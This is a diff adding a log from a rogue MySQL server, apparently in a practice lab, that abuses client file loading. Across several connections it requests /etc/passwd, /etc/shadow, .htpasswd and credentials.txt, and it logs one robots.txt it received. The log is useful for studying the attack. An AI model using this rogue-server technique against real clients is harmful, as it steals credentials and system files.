+2020-06-20 23:55:21,872:INFO:Conn from: ('10.10.10.187', 40710)
+2020-06-20 23:55:21,873:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:55:22,018:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:55:22,018:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:55:22,018:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:55:22,018:INFO:Last packet
+2020-06-20 23:55:22,064:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:55:22,064:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:55:22,064:INFO:Query
+2020-06-20 23:55:22,064:DEBUG:Pushed: '\x07\x00\x00\x01\xfb../hta'
+2020-06-20 23:55:22,222:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:55:22,222:DEBUG:Data recved: '\x02'
+2020-06-20 23:55:22,222:INFO:-- result
+2020-06-20 23:55:22,222:INFO:Result: '\x02'
+2020-06-20 23:55:22,222:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:55:22,223:INFO:Last packet
+2020-06-20 23:55:22,268:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:55:22,268:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:55:22,268:INFO:Query
+2020-06-20 23:55:22,269:DEBUG:Pushed: '\x0e\x00\x00\x01\xfb../robots.txt'
+2020-06-20 23:55:22,409:DEBUG:Data recved: '\x8a\x00\x00'
+2020-06-20 23:55:22,409:DEBUG:Data recved: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-20 23:55:22,409:INFO:-- result
+2020-06-20 23:55:22,410:INFO:Result: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-20 23:55:22,410:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:55:22,410:DEBUG:Data recved: '\x03'
+2020-06-20 23:55:22,410:INFO:-- result
+2020-06-20 23:55:22,410:INFO:Result: '\x03'
+2020-06-20 23:55:22,410:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:55:22,410:INFO:Last packet
+2020-06-20 23:55:22,495:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:55:22,495:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:55:22,495:INFO:Query
+2020-06-20 23:55:22,495:DEBUG:Pushed: '\r\x00\x00\x01\xfb../local.xml'
+2020-06-20 23:55:22,547:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:55:22,547:DEBUG:Data recved: '\x02'
+2020-06-20 23:55:22,547:INFO:-- result
+2020-06-20 23:55:22,547:INFO:Result: '\x02'
+2020-06-20 23:55:22,547:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:55:22,547:INFO:Last packet
+2020-06-20 23:55:22,636:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:55:22,637:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:55:22,637:INFO:Query
+2020-06-20 23:55:22,637:DEBUG:Pushed: '\x0e\x00\x00\x01\xfb../robots.txt'
+2020-06-20 23:55:22,689:DEBUG:Data recved: '\x8a\x00\x00'
+2020-06-20 23:55:22,689:DEBUG:Data recved: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-20 23:55:22,690:INFO:-- result
+2020-06-20 23:55:22,690:INFO:Result: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-20 23:55:22,690:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:55:22,690:DEBUG:Data recved: '\x03'
+2020-06-20 23:55:22,690:INFO:-- result
+2020-06-20 23:55:22,690:INFO:Result: '\x03'
+2020-06-20 23:55:22,690:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:55:22,690:INFO:Last packet
+2020-06-20 23:55:22,834:DEBUG:Data recved: '\x0e\x00\x00'
+2020-06-20 23:55:22,834:DEBUG:Data recved: '\x00\x03SELECT USER()'
+2020-06-20 23:55:22,834:INFO:Query
+2020-06-20 23:55:22,834:DEBUG:Pushed: '\x13\x00\x00\x01\xfb../credentials.txt'
+2020-06-20 23:55:24,053:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:55:24,054:DEBUG:Data recved: '\x02'
+2020-06-20 23:55:24,054:INFO:-- result
+2020-06-20 23:55:24,054:INFO:Result: '\x02'
+2020-06-20 23:55:24,055:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:55:24,055:INFO:Last packet
+2020-06-20 23:55:24,147:INFO:Conn from: ('10.10.10.187', 40712)
+2020-06-20 23:55:24,147:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:55:24,193:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:55:24,193:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:55:24,193:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:55:24,194:INFO:Last packet
+2020-06-20 23:55:24,239:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:55:24,240:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:55:24,240:INFO:Query
+2020-06-20 23:55:24,240:DEBUG:Pushed: '\x07\x00\x00\x01\xfb../hta'
+2020-06-20 23:55:24,287:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:55:24,287:DEBUG:Data recved: '\x02'
+2020-06-20 23:55:24,287:INFO:-- result
+2020-06-20 23:55:24,287:INFO:Result: '\x02'
+2020-06-20 23:55:24,287:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:55:24,288:INFO:Last packet
+2020-06-20 23:55:24,334:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:55:24,335:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:55:24,335:INFO:Query
+2020-06-20 23:55:24,335:DEBUG:Pushed: '\x0e\x00\x00\x01\xfb../robots.txt'
+2020-06-20 23:55:24,384:DEBUG:Data recved: '\x8a\x00\x00'
+2020-06-20 23:55:24,385:DEBUG:Data recved: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-20 23:55:24,385:INFO:-- result
+2020-06-20 23:55:24,385:INFO:Result: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-20 23:55:24,385:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:55:24,385:DEBUG:Data recved: '\x03'
+2020-06-20 23:55:24,385:INFO:-- result
+2020-06-20 23:55:24,385:INFO:Result: '\x03'
+2020-06-20 23:55:24,385:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:55:24,385:INFO:Last packet
+2020-06-20 23:55:24,435:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:55:24,436:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:55:24,436:INFO:Query
+2020-06-20 23:55:24,436:DEBUG:Pushed: '\x13\x00\x00\x01\xfb../credentials.txt'
+2020-06-20 23:55:24,485:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:55:24,485:DEBUG:Data recved: '\x02'
+2020-06-20 23:55:24,485:INFO:-- result
+2020-06-20 23:55:24,485:INFO:Result: '\x02'
+2020-06-20 23:55:24,485:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:55:24,485:INFO:Last packet
+2020-06-20 23:55:24,536:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:55:24,536:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:55:24,536:INFO:Query
+2020-06-20 23:55:24,536:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:55:24,583:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:55:24,584:DEBUG:Data recved: '\x02'
+2020-06-20 23:55:24,584:INFO:-- result
+2020-06-20 23:55:24,584:INFO:Result: '\x02'
+2020-06-20 23:55:24,584:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:55:24,584:INFO:Last packet
+2020-06-20 23:55:24,633:DEBUG:Data recved: '\x17\x00\x00'
+2020-06-20 23:55:24,633:DEBUG:Data recved: '\x00\x03SELECT CONNECTION_ID()'
+2020-06-20 23:55:24,633:INFO:Query
+2020-06-20 23:55:24,633:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-20 23:55:24,685:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:55:24,685:DEBUG:Data recved: '\x02'
+2020-06-20 23:55:24,685:INFO:-- result
+2020-06-20 23:55:24,685:INFO:Result: '\x02'
+2020-06-20 23:55:24,685:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:55:24,685:INFO:Last packet
+2020-06-20 23:55:24,734:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:55:24,734:DEBUG:Data recved: '\x00\x03SHOW DATABASES'
+2020-06-20 23:55:24,735:INFO:Query
+2020-06-20 23:55:24,735:DEBUG:Pushed: '\r\x00\x00\x01\xfb../.htpasswd'
+2020-06-20 23:55:24,781:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:55:24,781:DEBUG:Data recved: '\x02'
+2020-06-20 23:55:24,781:INFO:-- result
+2020-06-20 23:55:24,781:INFO:Result: '\x02'
+2020-06-20 23:55:24,781:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:55:24,781:INFO:Last packet
+2020-06-20 23:55:24,828:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:55:24,828:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:55:24,828:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:55:24,828:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:58:38,252:INFO:Conn from: ('10.10.10.187', 40714)
+2020-06-20 23:58:38,252:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:58:38,298:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:58:38,298:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:58:38,298:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:58:38,299:INFO:Last packet
+2020-06-20 23:58:38,344:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:58:38,345:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:58:38,345:INFO:Query
+2020-06-20 23:58:38,345:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-20 23:58:38,395:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:58:38,395:DEBUG:Data recved: '\x02'
+2020-06-20 23:58:38,395:INFO:-- result
+2020-06-20 23:58:38,395:INFO:Result: '\x02'
+2020-06-20 23:58:38,395:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:58:38,395:INFO:Last packet
+2020-06-20 23:58:38,442:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:58:38,442:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:58:38,442:INFO:Query
+2020-06-20 23:58:38,442:DEBUG:Pushed: '\r\x00\x00\x01\xfb../.htpasswd'
+2020-06-20 23:58:38,489:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:58:38,489:DEBUG:Data recved: '\x02'
+2020-06-20 23:58:38,489:INFO:-- result
+2020-06-20 23:58:38,489:INFO:Result: '\x02'
+2020-06-20 23:58:38,489:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:58:38,489:INFO:Last packet
+2020-06-20 23:58:38,542:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:58:38,542:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:58:38,542:INFO:Query
+2020-06-20 23:58:38,542:DEBUG:Pushed: '\x07\x00\x00\x01\xfb../hta'
+2020-06-20 23:58:38,591:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:58:38,592:DEBUG:Data recved: '\x02'
+2020-06-20 23:58:38,592:INFO:-- result
+2020-06-20 23:58:38,592:INFO:Result: '\x02'
+2020-06-20 23:58:38,592:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:58:38,592:INFO:Last packet
+2020-06-20 23:58:38,660:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:58:38,661:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:58:38,661:INFO:Query
+2020-06-20 23:58:38,661:DEBUG:Pushed: '\r\x00\x00\x01\xfb../.htpasswd'
+2020-06-20 23:58:38,708:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:58:38,708:DEBUG:Data recved: '\x02'
+2020-06-20 23:58:38,708:INFO:-- result
+2020-06-20 23:58:38,708:INFO:Result: '\x02'
+2020-06-20 23:58:38,708:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:58:38,708:INFO:Last packet
+2020-06-20 23:58:38,780:DEBUG:Data recved: '\x0e\x00\x00'
+2020-06-20 23:58:38,780:DEBUG:Data recved: '\x00\x03SELECT USER()'
+2020-06-20 23:58:38,780:INFO:Query
+2020-06-20 23:58:38,780:DEBUG:Pushed: '\x13\x00\x00\x01\xfb../credentials.txt'
+2020-06-20 23:58:38,827:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:58:38,827:DEBUG:Data recved: '\x02'
+2020-06-20 23:58:38,827:INFO:-- result
+2020-06-20 23:58:38,827:INFO:Result: '\x02'
+2020-06-20 23:58:38,827:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:58:38,827:INFO:Last packet
+2020-06-20 23:58:38,943:INFO:Conn from: ('10.10.10.187', 40716)
+2020-06-20 23:58:38,943:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:58:38,992:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:58:38,992:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:58:38,993:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:58:38,993:INFO:Last packet
+2020-06-20 23:58:39,039:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:58:39,039:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:58:39,039:INFO:Query
+2020-06-20 23:58:39,039:DEBUG:Pushed: '\x07\x00\x00\x01\xfb../hta'
+2020-06-20 23:58:39,085:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:58:39,085:DEBUG:Data recved: '\x02'
+2020-06-20 23:58:39,085:INFO:-- result
+2020-06-20 23:58:39,085:INFO:Result: '\x02'
+2020-06-20 23:58:39,085:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:58:39,085:INFO:Last packet
+2020-06-20 23:58:39,131:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:58:39,131:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:58:39,131:INFO:Query
+2020-06-20 23:58:39,131:DEBUG:Pushed: '\x07\x00\x00\x01\xfb../hta'
+2020-06-20 23:58:39,178:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:58:39,178:DEBUG:Data recved: '\x02'
+2020-06-20 23:58:39,178:INFO:-- result
+2020-06-20 23:58:39,178:INFO:Result: '\x02'
+2020-06-20 23:58:39,178:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:58:39,178:INFO:Last packet
+2020-06-20 23:58:39,224:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:58:39,224:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:58:39,224:INFO:Query
+2020-06-20 23:58:39,224:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb../htaccess'
+2020-06-20 23:58:39,271:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:58:39,271:DEBUG:Data recved: '\x02'
+2020-06-20 23:58:39,271:INFO:-- result
+2020-06-20 23:58:39,271:INFO:Result: '\x02'
+2020-06-20 23:58:39,271:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:58:39,271:INFO:Last packet
+2020-06-20 23:58:39,318:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:58:39,318:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:58:39,318:INFO:Query
+2020-06-20 23:58:39,318:DEBUG:Pushed: '\x07\x00\x00\x01\xfb../hta'
+2020-06-20 23:58:39,364:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:58:39,364:DEBUG:Data recved: '\x02'
+2020-06-20 23:58:39,364:INFO:-- result
+2020-06-20 23:58:39,364:INFO:Result: '\x02'
+2020-06-20 23:58:39,364:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:58:39,364:INFO:Last packet
+2020-06-20 23:58:39,411:DEBUG:Data recved: '\x17\x00\x00'
+2020-06-20 23:58:39,411:DEBUG:Data recved: '\x00\x03SELECT CONNECTION_ID()'
+2020-06-20 23:58:39,411:INFO:Query
+2020-06-20 23:58:39,411:DEBUG:Pushed: '\x13\x00\x00\x01\xfb../credentials.txt'
+2020-06-20 23:58:39,458:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:58:39,458:DEBUG:Data recved: '\x02'
+2020-06-20 23:58:39,459:INFO:-- result
+2020-06-20 23:58:39,459:INFO:Result: '\x02'
+2020-06-20 23:58:39,459:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:58:39,459:INFO:Last packet
+2020-06-20 23:58:39,505:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:58:39,505:DEBUG:Data recved: '\x00\x03SHOW DATABASES'
+2020-06-20 23:58:39,505:INFO:Query
+2020-06-20 23:58:39,505:DEBUG:Pushed: '\r\x00\x00\x01\xfb../.htpasswd'
+2020-06-20 23:58:39,552:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:58:39,552:DEBUG:Data recved: '\x02'
+2020-06-20 23:58:39,552:INFO:-- result
+2020-06-20 23:58:39,552:INFO:Result: '\x02'
+2020-06-20 23:58:39,552:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:58:39,552:INFO:Last packet
+2020-06-20 23:58:39,601:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:58:39,602:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:58:39,602:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:58:39,602:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:59:05,170:INFO:Conn from: ('10.10.10.187', 40718)
+2020-06-20 23:59:05,170:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:59:05,219:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:59:05,219:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:59:05,219:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:59:05,219:INFO:Last packet
+2020-06-20 23:59:05,265:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:59:05,265:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:59:05,265:INFO:Query
+2020-06-20 23:59:05,265:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb../htaccess'
+2020-06-20 23:59:05,314:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:59:05,314:DEBUG:Data recved: '\x02'
+2020-06-20 23:59:05,314:INFO:-- result
+2020-06-20 23:59:05,315:INFO:Result: '\x02'
+2020-06-20 23:59:05,315:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:59:05,315:INFO:Last packet
+2020-06-20 23:59:05,370:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:59:05,371:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:59:05,371:INFO:Query
+2020-06-20 23:59:05,371:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-20 23:59:05,417:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:59:05,417:DEBUG:Data recved: '\x02'
+2020-06-20 23:59:05,417:INFO:-- result
+2020-06-20 23:59:05,417:INFO:Result: '\x02'
+2020-06-20 23:59:05,417:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:59:05,417:INFO:Last packet
+2020-06-20 23:59:05,463:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:59:05,463:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:59:05,463:INFO:Query
+2020-06-20 23:59:05,463:DEBUG:Pushed: '\x0e\x00\x00\x01\xfb../robots.txt'
+2020-06-20 23:59:05,510:DEBUG:Data recved: '\x8a\x00\x00'
+2020-06-20 23:59:05,510:DEBUG:Data recved: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-20 23:59:05,510:INFO:-- result
+2020-06-20 23:59:05,510:INFO:Result: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-20 23:59:05,510:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:59:05,510:DEBUG:Data recved: '\x03'
+2020-06-20 23:59:05,510:INFO:-- result
+2020-06-20 23:59:05,510:INFO:Result: '\x03'
+2020-06-20 23:59:05,510:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:59:05,510:INFO:Last packet
+2020-06-20 23:59:05,556:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:59:05,557:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:59:05,557:INFO:Query
+2020-06-20 23:59:05,557:DEBUG:Pushed: '\x0e\x00\x00\x01\xfb../robots.txt'
+2020-06-20 23:59:05,604:DEBUG:Data recved: '\x8a\x00\x00'
+2020-06-20 23:59:05,605:DEBUG:Data recved: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-20 23:59:05,605:INFO:-- result
+2020-06-20 23:59:05,605:INFO:Result: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-20 23:59:05,605:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:59:05,605:DEBUG:Data recved: '\x03'
+2020-06-20 23:59:05,605:INFO:-- result
+2020-06-20 23:59:05,605:INFO:Result: '\x03'
+2020-06-20 23:59:05,605:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:59:05,605:INFO:Last packet
+2020-06-20 23:59:05,652:DEBUG:Data recved: '\x0e\x00\x00'
+2020-06-20 23:59:05,652:DEBUG:Data recved: '\x00\x03SELECT USER()'
+2020-06-20 23:59:05,652:INFO:Query
+2020-06-20 23:59:05,652:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb../htaccess'
+2020-06-20 23:59:05,698:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:59:05,698:DEBUG:Data recved: '\x02'
+2020-06-20 23:59:05,699:INFO:-- result
+2020-06-20 23:59:05,699:INFO:Result: '\x02'
+2020-06-20 23:59:05,699:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:59:05,699:INFO:Last packet
+2020-06-20 23:59:05,790:INFO:Conn from: ('10.10.10.187', 40720)
+2020-06-20 23:59:05,790:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:59:05,837:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:59:05,837:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:59:05,837:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:59:05,837:INFO:Last packet
+2020-06-20 23:59:05,883:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:59:05,883:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:59:05,883:INFO:Query
+2020-06-20 23:59:05,883:DEBUG:Pushed: '\x13\x00\x00\x01\xfb../credentials.txt'
+2020-06-20 23:59:05,930:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:59:05,930:DEBUG:Data recved: '\x02'
+2020-06-20 23:59:05,930:INFO:-- result
+2020-06-20 23:59:05,930:INFO:Result: '\x02'
+2020-06-20 23:59:05,930:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:59:05,930:INFO:Last packet
+2020-06-20 23:59:05,976:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:59:05,976:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:59:05,976:INFO:Query
+2020-06-20 23:59:05,976:DEBUG:Pushed: '\x13\x00\x00\x01\xfb../credentials.txt'
+2020-06-20 23:59:06,023:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:59:06,023:DEBUG:Data recved: '\x02'
+2020-06-20 23:59:06,023:INFO:-- result
